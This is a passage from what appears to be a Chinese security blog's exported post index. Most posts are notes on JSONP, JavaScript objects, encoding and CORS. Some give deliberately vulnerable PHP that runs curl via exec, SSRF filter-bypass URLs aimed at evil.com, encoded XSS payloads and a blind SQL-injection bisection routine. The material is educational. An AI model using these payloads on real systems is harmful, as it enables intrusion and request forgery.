http-equiv=&quot;Content-Type&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; function jsonpCallback(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;&lt;/script&gt;&lt;script src=&quot;http://pino.my.com/jsonp.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; 需要注意的是，function一定要定义在请求之前，否则会出现未定义的错误 这里我们访问 http://localhost:8080/jsonp.html ，这个网页中有一个跨域请求，请求pino.my.com的资源，通过callback的方式完成请求 成功获取服务端资源！ 前端——JQuery之getJSON方法getJSON方法的用法如下： 实现代码如下：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.ajax(&#123; url:&quot;http://pino.my.com/jsonp.php&quot;, dataType:&quot;jsonp&quot;, data:&quot;&quot;, jsonp:&quot;callback&quot;, success:function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, timeout:3000 &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 访问后同样成功获取资源 前端——JQuery之ajax方法代码12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery ajax&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.ajax(&#123; url:&quot;http://pino.my.com/jsonp.php&quot;, dataType:&quot;jsonp&quot;, data:&quot;&quot;, jsonp:&quot;callback&quot;, success:function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, timeout:3000 &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里的url是直接http://pino.my.com/jsonp.php，没有?callback，这是应为ajax方法的回调是直接放在success选项中了，因此需要在success选项中定义一个回调函数function 访问一下： 前端——JQuery之get方法12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery get&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.get(&quot;http://pino.my.com/jsonp.php?callback=?&quot;, function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, &apos;jsonp&apos; ); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; get方法需要写的东西跟getJSNON很像，但是一定别忘记最后还有一个jsonp的选项，否则会出错的。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>跨域</tag>
        <tag>JSONP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript中pop、push、shift、unshift方法的区别]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E4%B8%ADpop%E3%80%81push%E3%80%81shift%E3%80%81unshift%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[0x01 JS中的数组Array在Javascript中，创建一个数组的话一般如下：1var color = new Array(); 当然new关键字也可以省略，而pop、push、shift、unshift四种方法就是用来处理数组的。 0x02 栈方法在Javascript中的数组提供了一种让数组的行为类似于其他数据结构的方法，具体来说就是数组表现的像栈一样。栈是一种LIFO(后进先出)的数据结构。 push()方法可以接受任意数量的参数，把它们逐个添加到数组的末尾，并返回修改后数组的长度。 pop()方法则从数组末尾移除最后一项，减少数组的length值，然后返回移除的项。 具体例子: 0x03 队列方法栈数据结构是后进先出，而队列数据结构则是先进先出 由于push方法是向数组末端添加项的方法，因此要模拟队列只需一个从数组前端取得项的方法。shift方法能够移除数组中的第一个项并返回该项，同时将数组的长度减一。 具体例子： 0x04 模拟逆序队列操作在上一节说到了shift方法，该方法是移除队列的前端的一项，而unshift方法则与其相反，是向队列的前端添加一项，利用unshift和pop方法（从队列的末端拿出一项）可以实现逆序队列的操作]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符集]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%AD%97%E7%AC%A6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[0x01 字符与字节肉眼看到的一个文字或符号单元就是一个单元（包括乱码），一个字符可能对应1~n字节，1字节为8位，每一位要么是1，要么是0 0x02 字符集一个字符对应1~n字节是由字符集与编码决定的，比如，ASCII字符集就是一个字符对应1字节，不过1字节只用了7位，最高位用于其他目的，所以ASCII字符集共有2的7次方（128）个字符。 0x03 字符集编码一般字符集对应一种编码方式（比如GBK字符集对应了GBK编码），不过Unicode字符集的编码方式有UTF-8、UTF-7、UTF-16、URF-32。编码的目的是最终将这些字符正确的转换为计算机可理解的二进制，对应的解码就是将二进制最终解码为人类可读的字符。 0x04 宽字节编码GB2312、GBK、GB18030、BIG5等就是常说的宽字节，就是只有两字节。宽字节的问题主要是吃ASCII字符（一字节），比如，当字符集为GBK的时候，GBK编码第一字节（高字节）的范围0x81~0xFE，第二字节（低字节）的范围0x40~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5c，正好在GBK的低字节，如果之前有一个高字节，那么正好会被组成一个合法字符 GB2312是被GBK兼容的，它的高位是0xA1~0xF7，低位是0xA1~0xFE，但是在浏览器中处理行为同GBK，可能是浏览器兼容了，把GB2312统一按GBK处理。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>编码</tag>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[具备htmlencode功能的标签]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%85%B7%E5%A4%87htmlencode%E5%8A%9F%E8%83%BD%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[以下标签具有html编码的功能]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>XSS</tag>
        <tag>HTML标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript自解码机制]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[0x01 Javascript形式的编码 Unicode形式\uH(十六进制) 普通十六进制\xH 纯转义\’、\”、\&lt;、>这样在特殊字符之前加\进行转义 0x02 Javascript自解码机制在javascript执行之前，会进行自解码，将上述形式的编码转换为原始符号 譬如：1&lt;script&gt;document.write(&apos;\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x23\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e&apos;);&lt;/script&gt; 上面编码的代码是&lt;img src=# onerror=alert(‘xss’)&gt;虽然编码了，但是还是会执行alert()]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>编码</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[onmouseover与onmousemove的区别]]></title>
    <url>%2F2018%2F05%2F31%2Fonmouseover%E4%B8%8Eonmousemove%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[onmouseover事件是指当鼠标指针进入指定区域是触发而onmousemove事件是指当鼠标指针在指定区域移动时触发onmouseover主要是刚进入指定区域的那一瞬间onmousemove是除了刚进入的那一瞬间外，进入后在指定区域移动也算]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>XSS</tag>
        <tag>HTML标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端对象之Browser对象]]></title>
    <url>%2F2018%2F05%2F31%2FWeb%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%B1%A1%E4%B9%8BBrowser%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[0x01 前言之前对于Web前端不是很擅长，大概是总接触服务端的东西吧，之前有个面试问到了前端方面的知识，才发现自己的前端是有多烂，所以这里记一记笔记吧~ 0x02 Window对象 概念window对象是浏览器打开一个窗口。当HTML文档中包含iframe或frame的时候，浏览器会为HTML文档创建一个window对象，并为每一个iframe再额外创建一个window对象 常用对象属性 document 对Document对象的只读引用 frames 返回窗口中所有命名的frame框架，该属性是一个数组。 history 对History对象的只读引用 location 对Location对象的只读引用 navigator 对Navigator对象的只读引用 opener 返回对创建此窗口的窗口引用 parent 返回父窗口 self 返回当前窗口 top 返回最上层的父窗口 常用对象方法 alert() 弹警告窗 confirm() 弹确认窗 open() / close() 打开/关闭 窗口 print() 打印当前窗口的内容 focus() 给予当前窗口焦点 blur() 把键盘焦点从顶层窗口移开 setTimeout() 在指定的毫秒数后调用函数或计算表达式 setInterval() 按照指定的周期（以毫秒计）来调用函数或计算表达式 execScript() 与eval类似 0x03 Location对象 概念 Location对象包含当前URL的信息，可以用window.location访问 常用对象属性 hostname 返回主机名 pathname 返回路径名 host 返回主机名和端口号 port 返回端口号 protocol 返回协议 hash 返回锚部分（#后面的内容） href 返回完整的url search 返回查询部分（？后面的内容） 常用对象方法 assign() 加载新文档（就是访问一个网页） reload() 重新载入当前文档（刷新） replace() 用新文档替换当前文档 0x04 History对象 概述 History对象包含用户（在浏览器中）访问过的URL 常用对象属性 length返回History列表中URL数量 常用对象方法 back() 加载前一个History列表前一个URL forward() 加载后一个History列表后一个URL go() 直接加载一个History列表中具体的URL 0x05 Navigator对象 概述 Navigator对象包含浏览器的信息 常用对象属性 appCodeName 返回浏览器代码名称 appName 返回浏览器名称 appVersion 返回浏览器平台和版本信息 cookieEnable 返回浏览器是否启用cookie platform 返回运行浏览器的操作系统的版本 userAgent 返回浏览器的UA头]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端对象之Document]]></title>
    <url>%2F2018%2F05%2F31%2FWeb%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%B1%A1%E4%B9%8BDocument%2F</url>
    <content type="text"><![CDATA[0x01 Document对象当浏览器载入一个HTML文档时，它就变成了document对象。document对象是window对象的属性，可以用window.document来访问 0x02 常用对象属性 document.baseURI 返回网页的绝对URL（IE不支持） document.URL 返回网页的URL document.cookie 返回cookie document.body 返回文档body元素 docuemnt.referrer 返回载入当前文档的文档的 URL document.location 返回当前文档的URL 0x03 常用对象方法 document.write() 向文档中写东西 document.writeln() 跟document.write()一个功能，只不过每次写的时候都会加一个\n document.attachEvent() 事件绑定，仅支持IE浏览器 document.addEventListener() 事件绑定，支持所有浏览器 document.execCommand() 处理HTML数据 document.open() 打开一个输出流，用来收集document.write()和document.writeln()的输出的内容]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无法执行脚本的标签]]></title>
    <url>%2F2018%2F05%2F31%2F%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[0x01 无法直接执行脚本 12345678910111213141516- &lt;title&gt;&lt;/title&gt;- &lt;textarea&gt;&lt;/textarea&gt;- &lt;xmp&gt;&lt;/xmp&gt;- &lt;iframe&gt;&lt;/iframe&gt;- &lt;noscript&gt;&lt;/noscript&gt; noscript 元素用来定义在脚本未被执行时的替代内容（文本）。- &lt;noframes&gt;&lt;/noframes&gt; noframes 元素可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部。- &lt;plaintext&gt;&lt;/plaintext&gt; 标签的所有内容，将按照HTML源代码的方式显示 ##0 x02 无法嵌套其他标签 123- &lt;script&gt;&lt;/script&gt;- &lt;style&gt;&lt;/style&gt;]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML自解码机制]]></title>
    <url>%2F2018%2F05%2F31%2FHTML%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[0x01 HTML形式的编码 进制编码 &#xH;(十六进制格式)、&#D;（十进制形式）、最后的分号（;）可以不要 HTML实体编码 0x02 自解码机制当用户的输入出现在HTML标签内，js执行之前会进行自解码 例如1&lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&apos;)&quot; /&gt; 这段代码在执行的过程中，会将html实体编码自解码为之前的符号，因此这段代码会执行alert(1)的弹窗]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URL编码差异]]></title>
    <url>%2F2018%2F05%2F31%2FURL%E7%BC%96%E7%A0%81%E5%B7%AE%E5%BC%82%2F</url>
    <content type="text"><![CDATA[0x01 IE内核编码了双引号和右尖括号 0x02 Chrome编码了单引号、双引号、左右尖括号 0x03 Firefox编码了单引号、双引号、左右尖括号 0x04 相关PHP中，$_SERVER[‘QUERY_STRING’]是获取到浏览器urlencode后的内容而$_GET[‘c’]是获取urlencode之前的内容]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript常用字符串处理函数]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x01 string.charAt()参数index，返回字符串中指定位置的字符；如果超过字符串长度，则返回一个空字符串 0x02 string.charCodeAt()参数index，返回字符串指定位置的字符的unicode值 Unicode 编码单元（code points）的范围从 0 到 1114111。开头的 128 个 Unicode 编码单元和 ASCII 字符编码一样。如果指定的 index 小于 0 或大于字符串的长度，则 charCodeAt 返回 NaN。大于255的为中文 0x03 string.fromCharCode()参数一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。返回指定unicode值的字符 0x04 char.toString()此处参数是数字，返回指定字符的进制数]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript的三套编解码函数]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E7%9A%84%E4%B8%89%E5%A5%97%E7%BC%96%E8%A7%A3%E7%A0%81%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x01 escape/unescape编码结果 escape不编码的字符有69个1*、+、-、.、/、@、_、0~9、a~z、A~Z escape对0~255以外的unicode值进行编码的时候输出%u**格式 0x02 encodeURI编码结果 encodeURI不编码字符有82个1!、#、$、&amp;、&apos;、(、)、*、+、-、,、.、/、@、_、~、:、;、=、?、0~9、a~z、A~Z 0x03 encodeURIComponent编码结果 encodeURIComponent不编码字符有71个1!、&apos;、(、)、*、-、.、_、~、0~9、a~z、A~Z]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[0x01 同源策略什么是同源策略？简单来说，同源策略就是同协议、同端口、同HOST。同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。对于about:blank、javascript:这种特殊的URL，他们的源继承加载他们的页面的源，他们本身不存在源这个概念。 目前，如果非同源，共有三种行为受到限制。123（1） Cookie、LocalStorage 和 IndexDB 无法读取。（2） DOM 无法获得。（3） AJAX 请求不能发送。 0x02 HTTP请求控制总体来说，页面跨域行为主要有以下三类:Cross-origin read（跨域读）Cross-origin write（跨域写）Cross-origin embedding（跨域嵌入） 一般来说，只有Cross-origin read是不允许的，其他两种是被允许的。例如Cross-origin write的links、重定向、表单提交等，Cross-origin embedding的资源嵌入，在资源嵌入中，以下例子是被允许的12345678910111213&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;`标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的`Content-Type`消息头，不同浏览器有不同的限制。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;video&gt;和 &lt;audio&gt;嵌入多媒体资源。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;的插件。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;@font-face引入的字体。一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;frame&gt;和&lt;iframe&gt;载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 那么当我们想要跨域读取又该怎么办呢？这是我们就得用到另一个协议CORS跨域资源共享 0x03 参考文献https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy]]></content>
      <tags>
        <tag>Web前端</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CORS（跨域资源共享）]]></title>
    <url>%2F2018%2F05%2F31%2FCORS%EF%BC%88%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 前言我们都知道，浏览器是遵循同源策略的，同源策略用来限制从一个源加载的文档或脚本如何与另一个源的的资源进行交互，这是一个用来隔离潜在的恶意文件的安全机制。通常来说，浏览器是允许跨域写和跨域嵌入，但是跨域读取一般是不允许的，但是这样肯定是不方便的，因此后来有了话语资源共享，用来实现跨域读的功能。 0x02 跨域资源共享跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是GET以外的 HTTP 请求，或者搭配某些 MIME 类型的POST请求）浏览器必须首先使用OPTION方法发起一个预检请求，从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括COOKIE和 HTTP 认证相关数据）。 0x03 简单请求与非简单请求这里简单请求是指那些不会引起CORS预检请求的那种请求，而同理，非简单请求就是引起CORS预检请求。 简单请求 只要同时满足以下两大条件，就属于简单请求。123456789（1) 请求方法是以下三种方法之一：HEADGETPOST（2）HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 当浏览器发现请求是简单请求的时候，就会在请求头部添加一个Origin字段，该字段表示本次请求属于哪个源的，服务器会根据这个字段的值来决定是否允许跨域访问。 如果服务器不允许这个源的访问，那么服务器发送的response中，就没有Access-Control-Allow-Origin字段，当浏览器发现返回的消息中没有该字段，就知道出错了，从而抛出错误 如果服务器这个源的访问，那么服务器发送的response中，就会多出几个以Access-Control开头的字段 Access-Control-Allow-Origin 该字段是必须的，他表示允许访问的源，或者*，表示允许任意源访问。 Access-Control-Allow-Credentials 该字段是一个boolen值，如果是true，则允许发送cookie到服务器 Access-Control-Expose-Headers CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定 非简单请求 不同时满足上面的条件的就是非简单请求。 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的请求，否则就报错。 通常来说，预检请求是OPTION请求，在头信息中，包含着Origin字段，表示来自哪个源的。除了该字段，还有两个特殊的字段： Access-Control-Request-Method 该字段表示请求的方法是什么 Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求中出现的额外字段名。 当服务器同意了这次请求之后会在响应中添加相应的字段： Acces-Control-Allow-Origin 该字段表示允许的源 Access-Control-Allow-Method 该字段是必须的，是一个逗号分隔的字符串，表示服务器允许的跨域方法 Access-Control-Allow-Headers 如果请求中有Access-Control-Request-Headers字段的话，响应中就会有该字段，是一个逗号分隔的字符串，用来表示服务器允许的字段名。 Access-Control-Allow-Credentials 该字段也是用来表示服务器允许请求中包含cookie Access-Control-Max-Age 该字段表示本次预检请求的有效期，单位是秒。 但是如果服务器不允许请求，那么就会返回一个正常的HTTP Response给浏览器，浏览器发现响应中没有与CORS相关的字段，就知道服务器不允许这次请求，就会抛出错误。 0x04 参考文献http://www.ruanyifeng.com/blog/2016/04/cors.htmlhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF如何绕过filter_var和preg_match以及parse_url]]></title>
    <url>%2F2018%2F05%2F30%2FSSRF%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87filter-var%E5%92%8Cpreg-match%E4%BB%A5%E5%8F%8Aparse-url%2F</url>
    <content type="text"><![CDATA[0x01 前言这篇文章是在我看完一片国外安全大佬写的文章后对其进行总结并翻译得到的。 0x02 正文之绕过filter_var和preg_match本片文章主要深入一种php ssrf的技术——如何绕过例如filter_var(), preg_match()和parse_url()等函数。 本次我进行测试的php版本全部为php v5.6.30 PHP 漏洞代码12345678910111213141516171819202122232425&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; //check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL))&#123; //parse URL $r = parse_url($argv[1]); print_r($r); //check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;]))&#123; //get page from URL exec(&apos;curl -v -s &quot;&apos;.$r[&apos;host&apos;].&apos;&quot;&apos;, $a); print_r($a); &#125;else&#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125;else&#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这段代码里使用了filter_var()函数，preg_match()函数来进行过滤，并用parse_url()函数进行解析，最后利用exec函数执行curl命令进行访问网址。 在正式介绍绕过技术之前，我们需要了解一下以上函数的具体作用。 filter_var()filter_var — 使用特定的过滤器过滤一个变量 preg_match()该函数使用正则表达式来进行匹配特定的字符串 parse_url() ok，了解了这些函数后，说说上面的测试代码。这段代码的是获取第一个参数（这个参数是用来模拟通过$_GET或者$_POST方法获取的），然后通过filter_var()函数判断传入的url时候符合规定。如果如何规定，通过parse_url来解析这个参数，获取到host值，通过preg_match函数来判断host时候以baidu.com结尾。 运行上面的代码得到的正常结果如下： 如果不是正常的参数呢？ 1http://evil.com 绕过FILTER_VALIDATE_URL和正则表达式许多URL结构保留一些特殊的字符用来表示特殊的含义，这些符号在URL中不同的位置有着其特殊的语义。字符“;”, “/”, “?”, “:”, “@”, “=” 和“&amp;”是被保留的。除了分层路径中的点段，通用语法将路径段视为不透明。 生成URI的应用程序通常使用段中允许的保留字符来分隔。例如“；”和“=”用来分割参数和参数值。逗号也有着类似的作用。 例如，有的结构使用name;v=1.1来表示name的version是1.1，然而还可以使用name,1.1来表示相同的意思。当然对于URL来说，这些保留的符号还是要看URL的算法来表示他们的作用。 例如，如果用于hostname上，URL1http://evil.com;baidu.com 会被curl或者wget这样的工具解析为host:evil.com，querything:baidu.com 运行代码试一下 发现报错了，返回的是Invalid URL，那么因该是filter_var函数没有绕过。filter_var函数可以解析多种协议，我们可以试一下不是http的协议，例如10://evil.com;baidu.com ok,成功绕过filter_var和preg_match函数！但是我们发现它并没有解析我们的url，别担心，我们试试添加一下端口号，因为不是http的话默认端口就不是80了10://evil.com:80;baidu.com:80 ok，成功解析！ 当然，我们之前说的逗号也是可以跟分号是一个作用的 依旧成功！ 0x03 正文之绕过parse_urlparse_url函数不是用来验证URL的正确性的，而是尽可能的去解析URL，并把URL分割成特定的部分。在这种情况下，可以使用将URL的部分变为变量从而进行绕过。10://evil$baidu.com 这里，在bash中，$var是一个变量，在这个例子中$baidu这个变量未定义是个空，也就是说这个URL是0://evil&lt;空&gt;.com，也就是0://evil.com，成功绕过！ 但是这种方法也是有局限性的，因为需要利用bash中的特性，因此只有在php脚本中使用exec()、system()等命令执行的函数执行curl或者wget命令时才可以完成。 0x04 正文之data://伪协议和xss利用与上面的exec不同，这里我们使用的是filter_get_content函数，php的测试代码如下： 12345678910111213141516171819&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123; // get page from URL $a = file_get_contents($argv[1]); echo($a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125; else &#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这次我们的任务是在响应主体中修改内容，添加一个“Hacked by Pino_HD” 1data://text/plain;base64,SGFja2VkIGJ5IFBpbm8Kbaidu.com 发现parse_url函数把text设置成了host，然后报了Host not allowed错误。但是别担心，我们可以注入一些东西到MIME类型的地方，因为php是不关心MIME类型的。。 1data://baidu.com/plain;base64,SGFja2VkIGJ5IFBpbm8K ok，成功在响应包中写入我们想要写的东西。因此我们是可以控制响应体的内容，从而形成xss]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何提高盲注的效率]]></title>
    <url>%2F2018%2F05%2F30%2F%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%95%88%E7%8E%87%2F</url>
    <content type="text"><![CDATA[0x01 SQL注入之盲注提到SQL注入，我想懂安全的小伙伴们应该都知道的，那么今天就来聊一聊关于如何提高盲注效率的问题。盲注的话大体上分为三类把。 布尔盲注 时间盲注 报错盲注 0x02 提高效率一般盲注提高效率的话有两点 减少查询次数 提高查询的正确性 那么第一种方法我想说的就是二分法 二分法的话，学过数据结构的人都懂的，答题思路我用如下python代码来做介绍： 123456def inject(a, list, start, end): if start == end: return list[start] if ord(a) &gt; list[(start+end)/2]: return inject(a, list, end/2, end) return inject(a, list, start, end/2) 这里我解释一下上述的代码。这里a是要查询的那一位字符，list是a-zA-Z0-9这种用来对比的字符串，start是开始，end是结束。进入函数，如果start等于end说明找到了，返回那个字符，如果a的ascii值大于list的中间字符的ascii，说明a的真正值在list的后半部分，因此start变为end／2；否则的话就是a的值在list的前半部分，因此end变成end／2 第二种方法就是位运算法 原理就是每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;，可以通过bin(ascii(‘a’))&amp;1,2,4,8,16…来获取8位二进制]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行时管道符和AND符的区别]]></title>
    <url>%2F2018%2F05%2F30%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%B6%E7%AE%A1%E9%81%93%E7%AC%A6%E5%92%8CAND%E7%AC%A6%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
